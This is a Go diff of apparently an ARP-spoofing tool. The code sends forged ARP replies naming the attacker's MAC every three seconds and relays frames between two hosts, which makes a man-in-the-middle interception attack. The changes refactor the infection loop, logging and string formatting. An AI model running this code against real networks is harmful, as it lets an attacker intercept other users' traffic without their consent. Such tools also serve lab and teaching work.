@@ -191,9 +191,10 @@ func (s *Session) recover(handle *pcap.Handle, attacker *Host) {
 }
 
 func (s *Session) infect(handle *pcap.Handle, attacker *Host) {
+	defer s.recover(handle, attacker)
 	ticker3sec := time.Tick(time.Second * 3)
 	ticker3min := time.Tick(time.Minute * 3)
-L:
+	log.Println(s, "Infection Start.")
 	for {
 		select {
 		case <-ticker3sec:
@@ -210,10 +211,10 @@ L:
 				SrcHwAddress:   attacker.MAC,
 			}, layers.ARPReply)
 		case <-ticker3min:
-			break L
+			return
 		}
 	}
-	s.recover(handle, attacker)
+	log.Println(s, "Infection End.")
 }
 
 func (s *Session) relay(handle *pcap.Handle, attacker *Host) {
@@ -232,11 +233,9 @@ func (s *Session) relay(handle *pcap.Handle, attacker *Host) {
 		case bytes.Equal(eth.SrcMAC, s.Sender.MAC):
 			eth.DstMAC = s.Receiver.MAC
 			eth.SrcMAC = attacker.MAC
-			fmt.Print(">")
 		case bytes.Equal(eth.SrcMAC, s.Receiver.MAC):
 			eth.DstMAC = s.Sender.MAC
 			eth.SrcMAC = attacker.MAC
-			fmt.Print("<")
 		default:
 			continue
 		}
@@ -252,7 +251,7 @@ func (s *Session) relay(handle *pcap.Handle, attacker *Host) {
 }
 
 func (s *Session) String() string {
-	return fmt.Sprintf("Sender: (%s)\nReceiver: (%s)\n", s.Sender, s.Receiver)
+	return fmt.Sprintf("Sender: %s\nReceiver: %s\n", s.Sender.IP, s.Receiver.IP)
 }
 
 func (h *Host) String() string {
